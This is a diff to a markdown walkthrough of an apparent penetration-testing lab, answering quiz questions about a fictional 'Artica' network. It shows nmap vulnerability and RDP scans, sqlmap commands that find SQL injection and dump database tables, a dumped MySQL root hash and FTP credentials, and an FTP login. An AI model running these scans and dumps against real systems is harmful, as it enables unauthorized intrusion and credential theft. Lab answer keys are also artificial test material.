@@ -27,6 +27,8 @@
 - `curl --head http://10.102.X.Y`
 - Result: Host 4 has **Apache/2.4.29** running
 
+#### Scans
+
 - Unknown Host 1
 
 ![grafik](https://user-images.githubusercontent.com/84674087/132574540-6a740f35-4668-4091-8921-9c599b1cd844.png)
@@ -50,8 +52,85 @@
 2. SQL Injection
 3. Local File Inclusion
 
-- We start scanning host 4 for vulnerabilities: `nmap -p80 --script=vuln 10.102.11.66`
+#### Approach
+
+- We start scanning Host 4 for vulnerabilities: `nmap -p80 --script=vuln 10.102.11.66`
 - Result: It seems no obvious DOM based XSS or stored XSS vulnerability is exisiting
 - Further, after analyzing the website we can confirm there is no input field available, i.e. no file upload mechanism
 - The leftover option seems SQL Injection, so we follow this track ...
+- A first hint: the single `'` forces an internal error
+
+![grafik](https://user-images.githubusercontent.com/84674087/132576273-8a63dcb4-e42c-4159-8c71-4f4743c8682b.png)
+
+- We start Burpsuite and capture the GET request from the only webpage with client interaction, i.e. with parameter transfer
+
+![grafik](https://user-images.githubusercontent.com/84674087/132576664-df8ce7bd-c71c-4958-a4bb-6f0d039252ef.png)
+
+- Now we start sqlmap, leverage the GET request, which we saved as "req.txt", and use "to" as paramter to check through
+- `sqlmap -r req.txt -p “to”`
+- The host seems vulnerable !
+
+![grafik](https://user-images.githubusercontent.com/84674087/132576958-7295cfb8-f9a9-43ee-bda3-35ade71aa34e.png)
+
+- Then we examine further: `sqlmap -r req.txt -p “to” --tables`
+- This reveals four databases:
+    - artica (2 tables)
+    - information_schema
+    - mysql (30 tables)
+    - ...
+- This confirms that **Artica's intranet is vulnerable to SQL Injections** (!)
+ 
+![grafik](https://user-images.githubusercontent.com/84674087/132577166-ebb1138b-d8a5-4105-89f6-5a8d3094f8fe.png)
+
+![grafik](https://user-images.githubusercontent.com/84674087/132577174-5328591e-90e2-4c29-8b2a-1faf500a0de1.png)
+
+- We dump users from mysql and receive the mysql password hash from root !
+- `sqlmap -r req.txt -p “to” -D mysql -T user --dump`: **root@localhost : *5A33F8157E73ADDBC5AE8B8C49C55F770465A270**
+
+## Question 4: What is the username of the FTP account that can be found in the intranet database?
+
+- `sqlmap -r req.txt -p “to” -D artica -T windows_directory --dump`
+- Result: **artica-ftp-acc: 0912jgf93FSnjf**
+
+## Question 5: Which of the following tdirectories exists on the FTP server?
+1. Tools
+2. Compliance
+3. FTPROOT
+4. ADMIN-FILES?
+
+#### Approach
+- `ftp -v 10.102.5.21 21`
+- Result: **Tools**
+
+![grafik](https://user-images.githubusercontent.com/84674087/132578183-a1d3bc76-392e-4aa7-a8fd-b581a6e5b623.png)
+
+## Question 6: Which port is NOT open on Unknown Host 2?
+
+- `nmap -O -sV 10.102.3.116`
+- Result: Port 21
+
+![grafik](https://user-images.githubusercontent.com/84674087/132578304-eb4d20b2-4d20-4556-bd7b-f3d8db88335b.png)
+
+## Question 7: What is the name of the domain Unknown Host 2 is connected to?
+
+- Tools like nbtscan, rpcclient or rdesktop did not show success
+- Instead, nmap helped out thanks to its scripts
+- `nmap --script=rdp* -p3389 -T4 10.102.8.99`
+- Result: **artica.office**
+
+![grafik](https://user-images.githubusercontent.com/84674087/132578728-a2e15a24-7782-4ed0-9290-3d572edd0a15.png)
+
+![grafik](https://user-images.githubusercontent.com/84674087/132578759-a7e5dd0b-fb5a-449a-97c4-76ae75e0bca9.png)
+
+![grafik](https://user-images.githubusercontent.com/84674087/132578776-f887a62c-b6dd-4ddd-8f57-ef1f7f43e6a5.png)
+
+## Question 8: What is the NetBIOS computer name of Unknown Host 1?
+
+- We simply use nmap again but upon another host
+- `nmap --script=rdp* -p3389 -T4 10.102.5.21`
+- Result: **ARTICA-WIN-FTP**
+
+![grafik](https://user-images.githubusercontent.com/84674087/132578932-bdbe6948-d2ec-4e15-a566-1fa8abbd6c1f.png)
+
+## Question 9: What type of attack is the fax server vulnerable to?
 
